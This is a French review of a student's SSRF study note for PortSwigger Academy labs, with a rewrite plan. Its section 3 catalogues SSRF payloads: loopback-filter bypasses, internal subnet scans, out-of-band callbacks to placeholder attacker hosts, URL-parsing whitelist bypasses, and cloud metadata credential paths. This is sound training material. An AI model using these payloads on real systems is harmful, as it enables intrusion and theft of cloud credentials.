# Revue documentaire de la note SSRF.md

Date : 2026-11-06
Périmètre : revue de lecture uniquement. Aucune requête envoyée, aucun lab rejoué, aucune note modifiée.
Fichiers lus : `01-Server-side/SSRF/SSRF.md` (190 lignes), les sept fiches courtes du même dossier (lues pour doublons et liens), et la section SSRF (lignes 83 à 97) de `04-Essential-skills/Payloads-cheatsheet.md`.

Légende : "confirmé par la note" signifie que le journal du lab correspondant est rédigé et coché comme réalisé. "À vérifier" signifie non rejoué par l'utilisateur. Rien de ce document n'a été testé par l'analyste.

## 0. État des labs d'après la note

| Lab | Niveau | État d'après la note | Recommandation |
| --- | --- | --- | --- |
| Lab 1, serveur local | Apprentice | Réalisé (case Apprentice cochée le 2026-10-07, journal rédigé) | Réécriture possible |
| Lab 2, autre système back-end | Apprentice | Réalisé (idem) | Réécriture possible |
| Lab 3, liste noire | Practitioner | Réalisé (case Practitioner cochée le 2026-10-07, journal rédigé) | Réécriture possible |
| Lab 4, redirection ouverte | Practitioner | Réalisé (idem) | Réécriture possible |
| Lab 5, SSRF aveugle hors bande | Practitioner | Réalisé (idem) | Réécriture possible |
| Lab 6, liste blanche | Expert | Non réalisé : case Expert décochée, et l'encadré avertit que les étapes sont rédigées de mémoire et jamais rejouées | Laisser la section dans son état actuel |
| Lab 7, Shellshock en aveugle | Expert | Non réalisé : même constat, avertissement explicite | Laisser la section dans son état actuel |

Pour les labs 6 et 7 : aucune solution, aucun déroulé et aucun plan de résolution n'est proposé ici. Recommandation : ne pas toucher à ces deux sections, ni les compléter, ni les corriger, tant que l'utilisateur n'a pas fait les labs lui-même. Une réserve de fond figure en section 2 (la solution est déjà écrite dans la note, ce qui est un choix de l'utilisateur à arbitrer, pas une chose à corriger ici).

Remarque de fiabilité : les journaux des labs 1 à 5 reprennent presque mot pour mot la formulation de l'énoncé et de la solution officielle traduite (étapes numérotées, "constatez que"). Ils décrivent donc l'itinéraire officiel plutôt que ce que l'utilisateur a observé. Ce n'est pas un défaut de contenu, mais cela limite leur valeur de journal personnel (voir plan de réécriture).

## 1. Ce qui manque ou est flou

### 1.1 Concepts
- Aucune définition de ce qu'est une requête "côté serveur" par rapport à une requête du navigateur : un schéma de flux en une phrase (client, application, destination) clarifierait tout. L'image `SSRF.png` est référencée ligne 13 mais le fichier est absent du dossier (le listage du dossier ne contient aucun PNG) : lien d'image cassé.
- "Relation de confiance" est citée (ligne 22) sans exemple concret dans la note parente (contrôle d'accès en amont, accès local sans authentification, port d'administration distinct : ces exemples existent dans `SSRF-serveur-local`, il suffit de les référencer).
- Distinction manquante entre SSRF complète (réponse visible), SSRF aveugle (aucune réponse) et SSRF semi-aveugle (indices indirects : code de statut, durée, taille, message d'erreur). La note ne parle que des deux premières.
- Différence entre contrôle du schéma, de l'hôte, du port et du chemin : à poser une fois, car toute la logique de contournement en dépend.

### 1.2 Méthodologie de détection (section lignes 35 à 40)
- Ne couvre pas la comparaison systématique à trois points : valeur d'origine, hôte local, hôte inexistant. C'est ce qui distingue "filtré" de "non joignable" de "joignable".
- Pas de signaux d'observation listés : code de statut, longueur, durée de réponse, texte d'erreur, interaction DNS seule contre DNS plus HTTP.
- La ligne 39 ("si seule une requête DNS arrive, la requête HTTP est probablement filtrée en sortie") doit être nuancée : cela peut aussi être une simple résolution préalable par une validation, sans requête sortante ensuite. Hypothèse, pas preuve.
- Pas de checklist d'emplacements : paramètres JSON et XML, en-têtes (`Referer`, `Host`, `X-Forwarded-Host`), champs de webhook, import par URL, génération de PDF, aperçu de lien, avatar distant. Cette liste existe partiellement dans `SSRF-surfaces-cachees` mais la note parente ne la reprend pas.

### 1.3 Cas par variante
- Tableau lignes 25 à 33 : le niveau "Practitioner, Expert" de la ligne aveugle n'est pas expliqué (lab 5 puis lab 7), alors que la note parente classe lab 6 et lab 7 en Expert sans les distinguer dans le tableau.
- Pas de tableau "symptôme observé, variante probable, étape suivante".
- Absence de méthodologie de balayage au-delà de l'octet final : ports, autres plages privées (`10.0.0.0/8`, `172.16.0.0/12`), temps de réponse comme oracle.
- Contournements de liste noire listés seulement dans la fiche enfant : la note parente n'a que `127.1` et le double encodage.

### 1.4 Limites
- Limites de l'exploitation absentes : schéma restreint à HTTP et HTTPS selon le client, absence de contrôle des en-têtes ou de la méthode (souvent GET seulement), actions sensibles qui demandent un GET (dans les labs, la suppression passe par un GET, ce qui n'est pas le cas général).
- Pas de mention que la validation peut se faire sur la résolution DNS puis que la requête re-résout (rebinding), ligne 55 le cite à peine.
- Pas de mention de la limite de taille ou du type de contenu renvoyé (une réponse non textuelle peut être tronquée ou rejetée).

### 1.5 Contre-mesures (lignes 57 à 63)
- Contenu correct dans l'ensemble. Manques : épingler l'adresse résolue pour la requête (contre le rebinding), interdire explicitement les redirections ou les revalider, exiger l'authentification sur les services internes et sur les métadonnées cloud (version 2 du service de métadonnées avec jeton), journalisation et alerte sur les requêtes sortantes inhabituelles.
- Ligne 61 ("ne jamais renvoyer la réponse brute") réduit l'impact mais ne supprime pas la SSRF ; à nuancer.

### 1.6 Pièges BSCP (lignes 51 à 55)
- Ligne 55 mélange "hors énoncé de la formation" et conseils de cible réelle : à séparer clairement du bloc BSCP.
- Manquent : ne pas se limiter à `stockApi` (le lab 5 montre qu'un en-tête peut être la porte d'entrée) ; vérifier si le lab exige Burp Professional (Collaborator, Intruder rapide) ; penser à relire la réponse complète, pas seulement le statut ; rester sur le serveur public par défaut de Collaborator (déjà présent).
- Le lien avec l'objectif de l'examen (accès à des fichiers ou à un compte via une chaîne) n'est pas mentionné : la SSRF y sert souvent de maillon, pas de fin en soi. Hypothèse de rédaction, à confirmer avec le programme officiel.

## 2. Ce qui est superflu, redondant ou hors sujet

### 2.1 Remarques de rédaction laissées dans le texte
- Lignes 147 à 148 et 163 à 164 : encadrés "Cette section n'était pas dans la page d'origine... reconstituées de mémoire". Ce sont des métadonnées de travail, utiles comme avertissement tant que les labs ne sont pas faits. Recommandation : les conserver tels quels jusqu'à réalisation des labs 6 et 7.
- Ligne 175 à 176 : section "Mes notes" vide (puce vide). À remplir par l'utilisateur ou supprimer.
- Ligne 137 : encadré "Remarque" sur le pare-feu de l'Academy, déjà dit ligne 54 et dans `SSRF-aveugle`. Doublon à trois endroits.

### 2.2 Liens hors sujet ou à valider
- `[[Command-injection]]` (ligne 186) : pertinent seulement pour le lab 7 (Shellshock, injection de commande par en-tête). À justifier ou retirer.
- `[[Access-control]]` : pertinent pour la confiance locale. À justifier par une phrase.
- `[[Web-cache-poisoning]]` : pas de lien visible avec le contenu de la note. Probablement hors sujet (peut-être lié à l'en-tête `Host`). À retirer ou à justifier.
- `[[HTTP-Host-header]]` : pertinent seulement pour l'en-tête `Host` (cité dans `SSRF-surfaces-cachees`).
- `[[XXE-injection]]` : pertinent (SSRF via XXE).
- `[[DOM-based]]`, cité dans `SSRF-redirection-ouverte` : probablement hors sujet, une redirection ouverte côté serveur n'est pas du DOM. À confirmer (la redirection ouverte basée sur le DOM existe dans la formation côté client, donc le lien peut être voulu pour la redirection, pas pour la SSRF). Les six cibles de liens existent dans le coffre.
- Les liens de la section "Liens" (lignes 179 à 185) répètent presque tous le tableau lignes 27 à 33 et la section de chaque lab : redondance.

### 2.3 Redondances entre la note parente et les fiches
- "Comment exploiter (principe)" de la note parente (lignes 42 à 49) résume ce que font les fiches enfants, mais l'étape 5 ("lire le HTML de l'interface") est répétée dans `SSRF-serveur-local`.
- Les journaux des labs recopient les mêmes URL que les fiches : `http://localhost/admin`, `127.1`, `%2561`, l'exemple de redirection. À garder dans le journal et les retirer des fiches, ou l'inverse.
- L'exemple `http://192.168.0.68/admin` (fiche back-end) et `http://192.168.0.12:8080/admin` (lab 4) coexistent : harmoniser les adresses d'exemple pour éviter de confondre exemple théorique et valeur de lab.
- Le texte "Le développeur a mis en place deux défenses anti-SSRF faibles" et la liste noire sont dits dans la note parente et dans la fiche.

### 2.4 Fautes et incohérences de forme
- Ligne 12 : "L'impact est qu'une fuite de données sensibles est possible" : lourd, et l'impact complet est à la ligne 16 à 19. À fusionner.
- Ligne 141 : "la commande côté serveur est exécutée de façon asynchrone" est inexact pour le lab 5 (il n'y a pas de commande, c'est une requête HTTP déclenchée par l'analyse du `Referer`). Reformuler : le traitement côté serveur est asynchrone.
- Ligne 140 : l'interface Burp a une formulation précise ("Insert Collaborator payload") ; vérifier que la graphie reprend bien l'interface utilisée.
- Mélange de guillemets typographiques et de gras pour les noms de boutons (« Check stock » ligne 79, **Check stock** ligne 92).
- Dans `SSRF-filtre-liste-noire`, la ligne "`spoofed.burpcollaborator.net`" est un domaine de la documentation PortSwigger : la note doit préciser que c'est un exemple à vérifier (voir catalogue, section 3).
- Dans `Payloads-cheatsheet.md`, les lignes SSRF utilisent des tirets cadratins comme séparateurs (lignes 84 à 96). Hors périmètre de cette revue, mais contraire à la règle de style du projet : à signaler pour une correction lors d'une prochaine passe.
- Ligne 66 et 67 : cases cochées avec une coche emoji en plus de la case ; style à unifier.
- Ligne 62 de la note : "ne pas se reposer" est correct ; pas de faute orthographique repérée par ailleurs dans le texte lu.

### 2.5 Réserve de fond sur les solutions écrites
- Les labs 6 et 7 contiennent déjà des solutions complètes alors que l'utilisateur ne les a pas faits. Cela relève d'un choix de l'utilisateur (elles sont signalées comme "de mémoire, non rejouées"). Cette revue ne les complète ni ne les modifie. Si l'objectif est de s'entraîner pour l'examen, la valeur pédagogique est plus forte en les masquant ou en les déplaçant dans un bloc replié jusqu'à réalisation, mais c'est une suggestion de forme, à décider par l'utilisateur.

## 3. Catalogue de payloads par variante

Convention : "Rejoué" = présent dans un journal de lab 1 à 5 réalisé par l'utilisateur. Tout le reste est "à vérifier". Les valeurs entre majuscules ou entre crochets sont des espaces réservés. Tous ces payloads sont à utiliser uniquement sur des labs ou des cibles autorisées.

### 3.1 Serveur local
| Payload | Contexte | Signal attendu | Limites | État |
| --- | --- | --- | --- | --- |
| `stockApi=http://localhost/admin` | Paramètre contenant une URL complète | Contenu de l'interface d'administration dans la réponse | Bloqué si filtre sur `localhost` | Rejoué (lab 1) |
| `stockApi=http://127.0.0.1/admin` | Idem, forme numérique | Idem | Même filtre | À vérifier hors lab 3 (le lab 3 montre que ce blocage existe) |
| `http://localhost:PORT/admin` pour `PORT` parmi 80, 8080, 8000, 8443 | Interface d'administration sur un autre port | Réponse différente selon le port | Balayage de ports lent | À vérifier |
| `http://localhost/console`, `/actuator` | Chemins sensibles d'après la fiche | Contenu ou code différent de 404 | Dépend de la technologie | À vérifier |
| URL de suppression lue dans le HTML (`.../admin/delete?username=carlos`) | Action à déclencher | Action effectuée | GET seulement, le chemin vient du HTML | Rejoué (lab 1) |

### 3.2 Systèmes back-end internes
| Payload | Contexte | Signal attendu | Limites | État |
| --- | --- | --- | --- | --- |
| `stockApi=http://192.168.0.§1§:8080/admin` | Balayage Intruder, payload Numbers de 1 à 255 | Un seul statut différent (souvent 200) | Port et plage supposés connus | Rejoué (lab 2) |
| `http://10.0.0.§1§/` et `http://172.16.0.§1§/` | Autres plages privées | Statut ou durée différents | Large espace à balayer | À vérifier |
| `http://192.168.0.1:§80§/` avec liste de ports | Port inconnu | Différence de statut ou de durée | Bruit élevé | À vérifier |
| Mesure du temps de réponse | Aucune réponse visible | Rapide avec erreur : hôte atteint ; lent : filtré | Interprétation incertaine | Hypothèse |

### 3.3 Aveugle hors bande
| Payload | Contexte | Signal attendu | Limites | État |
| --- | --- | --- | --- | --- |
| `Referer: http://BURP-COLLABORATOR-SUBDOMAIN` | Logiciel d'analyse qui récupère le `Referer` | Interactions DNS puis HTTP dans Collaborator après "Poll now" | Traitement asynchrone, attendre | Rejoué (lab 5) |
| `stockApi=http://BURP-COLLABORATOR-SUBDOMAIN/` | Paramètre URL sans réponse visible | Interaction DNS et HTTP | Pare-feu des labs : serveur public par défaut seulement | À vérifier |
| `Host: BURP-COLLABORATOR-SUBDOMAIN` ou `X-Forwarded-Host: ...` | En-têtes que le serveur peut résoudre | Interaction DNS | Dépend de l'infrastructure | À vérifier |
| URL de Collaborator dans un champ XML, un webhook, une génération de PDF | Surfaces cachées | Interaction DNS ou HTTP | Dépend de la fonctionnalité | À vérifier |
| DNS seul sans HTTP | Observation, pas un payload | Filtrage HTTP sortant probable | Peut aussi être une validation préalable | Hypothèse |

Le lab 7 (balayage avec charge Shellshock) est exclu volontairement du catalogue : lab non réalisé.

### 3.4 Contournement de liste noire
Représentations alternatives de `127.0.0.1` :
| Payload | Signal attendu | Limites | État |
| --- | --- | --- | --- |
| `http://127.1/` | Passe le filtre, page d'accueil | Le client HTTP doit accepter la forme abrégée | Rejoué (lab 3) |
| `http://2130706433/` (décimal) | Idem | Dépend de l'analyseur du serveur | À vérifier |
| `http://017700000001/` (octal) | Idem | Certains analyseurs lisent l'octal, d'autres non | À vérifier |
| `http://0x7f000001/` (hexadécimal) | Idem | Idem | À vérifier |
| `http://[::1]/` (IPv6) | Idem | Le service doit écouter en IPv6 | À vérifier |
| `http://0/` ou `http://0.0.0.0/` | Idem | Comportement variable selon le système | À vérifier |
| `http://127.0.0.1.nip.io/` ou service équivalent | Résolution DNS vers le bouclage | Dépend de l'accès DNS sortant du serveur | À vérifier |

Encodage et casse du chemin bloqué :
| Payload | Signal attendu | Limites | État |
| --- | --- | --- | --- |
| `http://127.1/%2561dmin` | Le chemin passe (double encodage de la lettre a) | Suppose un décodage en deux temps | Rejoué (lab 3) |
| `http://127.1/%61dmin` | Encodage simple | Souvent décodé par le filtre aussi | À vérifier |
| `http://127.1/ADMIN` | Variation de casse | Chemins sensibles à la casse sur beaucoup de serveurs | À vérifier |

Contournement par DNS :
| Payload | Signal attendu | Limites | État |
| --- | --- | --- | --- |
| `http://spoofed.burpcollaborator.net/` | Nom qui résout vers `127.0.0.1` d'après la documentation PortSwigger | Domaine d'exemple, à confirmer qu'il résout toujours ainsi | À vérifier |
| Domaine personnel avec enregistrement A vers `127.0.0.1` | Idem | Interdit dans les labs (pare-feu), possible sur cible autorisée | À vérifier |
| Redirection depuis une URL contrôlée vers la cible, codes 301, 302, 303, 307, ou de `http:` vers `https:` | La redirection est suivie | Le client doit suivre les redirections ; pare-feu des labs | À vérifier |

### 3.5 Contournement de liste blanche : confusion d'analyse d'URL
Les formes ci-dessous sont les classes génériques déjà décrites dans la fiche `SSRF-filtre-liste-blanche`. Le lab 6 n'étant pas réalisé, aucune combinaison propre à ce lab n'est ajoutée ici.
| Payload | Contexte | Signal attendu | Limites | État |
| --- | --- | --- | --- | --- |
| `https://EXPECTED-HOST@EVIL-HOST/` | Le filtre lit la partie avant `@` comme l'hôte | Requête acceptée et arrivée sur l'hôte réel | Dépend de la différence d'analyse entre filtre et client | À vérifier |
| `https://EXPECTED-HOST:fakepassword@EVIL-HOST/` | Même idée, avec mot de passe factice | Idem | Idem | À vérifier |
| `https://EVIL-HOST#EXPECTED-HOST` | Filtre qui cherche la valeur attendue n'importe où | Acceptée si le fragment n'est pas traité par le filtre | Beaucoup de filtres bloquent `#` | À vérifier |
| `https://EXPECTED-HOST.EVIL-HOST/` | Filtre sur préfixe ou sous-chaîne | Acceptée si la correspondance est lâche | Nécessite un domaine que l'on contrôle | À vérifier |
| Variantes encodées des caractères `@` et `#` | Divergence de décodage entre filtre et client | Acceptée une fois encodée, refusée en clair | Dépend du nombre de décodages | À vérifier |

### 3.6 Redirection ouverte
| Payload | Contexte | Signal attendu | Limites | État |
| --- | --- | --- | --- | --- |
| `stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin` | Chemin relatif accepté par le filtre, redirection ouverte via `path` | Page d'administration interne renvoyée | Le client doit suivre la redirection | Rejoué (lab 4) |
| `.../nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos` | Action de suppression | Action effectuée | Valeurs propres au lab | Rejoué (lab 4) |
| `.../redirect?url=http://BURP-COLLABORATOR-SUBDOMAIN` | Test préalable : la redirection mène-t-elle vers un domaine externe ? | Interaction Collaborator ou en-tête `Location` | Pare-feu des labs | À vérifier |

### 3.7 En-têtes Referer et Host
| Payload | Contexte | Signal attendu | Limites | État |
| --- | --- | --- | --- | --- |
| `Referer: http://BURP-COLLABORATOR-SUBDOMAIN` | Analyse de trafic côté serveur | Voir 3.3 | Aveugle | Rejoué (lab 5) |
| `Referer: http://192.168.0.X:8080/` | Cible interne par l'en-tête | Aucune réponse visible, seulement des effets de bord | Aveugle, dépend d'un effet observable | À vérifier |
| `Host: INTERNAL-HOST` | Routage par hôte virtuel côté serveur | Contenu d'un hôte virtuel interne | Voir la note `HTTP-Host-header` | À vérifier |
| `X-Forwarded-Host: BURP-COLLABORATOR-SUBDOMAIN` | Application qui construit des URL à partir de l'en-tête | Interaction DNS ou HTTP | Dépend de l'application | À vérifier |

### 3.8 Métadonnées cloud (hors programme des labs, cible réelle seulement)
| Payload | Contexte | Signal attendu | Limites | État |
| --- | --- | --- | --- | --- |
| `http://169.254.169.254/latest/meta-data/` | Instance AWS, service de métadonnées version 1 | Liste de clés de métadonnées | La version 2 exige un jeton obtenu par PUT, souvent infaisable via GET seul | À vérifier |
| `http://169.254.169.254/latest/meta-data/iam/security-credentials/` | Identifiants temporaires du rôle | Nom du rôle puis identifiants | Données très sensibles : ne pas exfiltrer en masse, preuve minimale seulement | À vérifier |
| `http://metadata.google.internal/computeMetadata/v1/` | Google Cloud | Réponse seulement avec l'en-tête `Metadata-Flavor: Google` | En-tête non contrôlable via une SSRF simple | À vérifier |
| `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | Azure | Réponse seulement avec l'en-tête `Metadata: true` | Idem | À vérifier |
| Schémas `file://`, `gopher://`, `dict://` | Client HTTP qui accepte d'autres schémas | Lecture de fichier ou envoi d'octets bruts | Rarement acceptés ; hors formation | À vérifier |

Les valeurs cloud proviennent de la connaissance générale de l'analyste, pas de la note ni d'un test ; aucune n'a été confrontée à une documentation du fournisseur pendant cette revue.

## 4. À reporter dans la cheat sheet (`04-Essential-skills/Payloads-cheatsheet.md`)

État de la cheat sheet : elle contient déjà (lignes 84 à 96) les entrées principales (serveur local, balayage, représentations de l'adresse, double encodage, nom qui résout vers le bouclage, `@`, `#`, sous-domaine, redirection ouverte, Collaborator via `Referer`, métadonnées cloud). Elle ne contient pas les lignes suivantes, à ajouter si l'utilisateur les valide :

Payloads courts, tous à vérifier sauf mention :
- `http://0/` : variante du bouclage (à vérifier)
- `http://127.1/ADMIN` : variation de casse du chemin (à vérifier)
- `http://127.1/%61dmin` : encodage simple de la lettre a (à vérifier)
- `http://10.0.0.§1§/` et `http://172.16.0.§1§/` : autres plages privées au balayage (à vérifier)
- `X-Forwarded-Host: BURP-COLLABORATOR-SUBDOMAIN` : test d'interaction par en-tête (à vérifier)
- `Host: INTERNAL-HOST` : test de routage par hôte (à vérifier)
- `http://169.254.169.254/latest/meta-data/iam/security-credentials/` : identifiants du rôle AWS, cible réelle seulement (à vérifier)
- `http://metadata.google.internal/computeMetadata/v1/` et en-tête `Metadata-Flavor: Google` (à vérifier)

Points d'attention sur l'existant :
- Ligne 92 de la cheat sheet (`http://localhost:80%2523@stock.weliketoshop.net/admin`) et ligne 95 (charge Shellshock) correspondent aux labs 6 et 7, non réalisés et reconstitués de mémoire. Les marquer "à vérifier, lab non réalisé" ou les retirer jusqu'à réalisation. Rien n'a été modifié.
- Ligne 88 : `spoofed.burpcollaborator.net` est à marquer "à vérifier".
- Tirets cadratins aux lignes 84 à 96 : à remplacer par des tirets normaux (règle de style du projet).

## 5. Plan de réécriture de la note

Principe : réécrire uniquement ce qui concerne les labs réalisés (1 à 5) et la partie théorique ; laisser tel quel le contenu des labs 6 et 7.

1. Frontmatter : conserver, statut "en cours" tant que l'Expert n'est pas fait.
2. En bref (lignes 8 à 13) : fusionner "En bref" et "Impact" en un bloc, ajouter un schéma de flux en une phrase, corriger ou fournir l'image `SSRF.png` (absente du dossier).
3. Types et variantes : conserver le tableau, ajouter une colonne "Signal d'observation" et une explication de la ligne "Practitioner, Expert" pour l'aveugle.
4. Détection : réécrire autour de la comparaison à trois points (valeur d'origine, hôte local, hôte inexistant) et d'une liste d'emplacements, avec la nuance sur le DNS seul.
5. Exploitation (principe) : garder la séquence en cinq étapes, ajouter la distinction complète, aveugle, semi-aveugle, et les limites (schéma, méthode, port, taille).
6. Pièges BSCP : séparer "attendu dans les labs" de "cible réelle" (métadonnées, schémas, rebinding) ; supprimer le doublon sur le pare-feu de l'Academy.
7. Prévention : ajouter épinglage de l'adresse résolue, authentification des services internes et des métadonnées, journalisation.
8. Journal des labs 1 à 5 : reformuler en notes personnelles courtes (ce qui a été observé, ce qui a bloqué, ce qui a été retenu) au lieu de la copie de la solution officielle ; l'utilisateur doit y mettre ses propres observations, l'analyste ne peut pas les inventer. Corriger la phrase inexacte sur la "commande" du lab 5.
9. Labs 6 et 7 : ne pas toucher. Conserver les encadrés d'avertissement et la case Expert décochée. Les compléter seulement après réalisation par l'utilisateur.
10. "Mes notes" : à remplir par l'utilisateur ou supprimer.
11. Liens : ne garder que les liens justifiés par une phrase (`XXE-injection`, `HTTP-Host-header`, `Access-control`, `Command-injection` pour le lab 7) et retirer ou justifier `Web-cache-poisoning`. Vérifier le lien `DOM-based` de la fiche `SSRF-redirection-ouverte`.
12. Style : tirets normaux uniquement, noms de boutons dans une graphie unique, une seule forme de coche.
13. Fiches enfants : après la réécriture, conserver dans chaque fiche la théorie et les payloads, et dans la note parente seulement le journal, pour supprimer les doublons identifiés en 2.3.

## 6. Limites de cette revue
- Aucun payload n'a été testé ni envoyé : tout le catalogue est de la documentation, avec l'état "rejoué" uniquement établi d'après les journaux de la note.
- Les valeurs du tableau cloud et les exemples tels que `spoofed.burpcollaborator.net` n'ont pas été confrontés à une source pendant cette revue.
- L'absence de l'image `SSRF.png` repose sur un listage du dossier ; elle pourrait se trouver dans un dossier de pièces jointes ailleurs dans le coffre (non recherché).
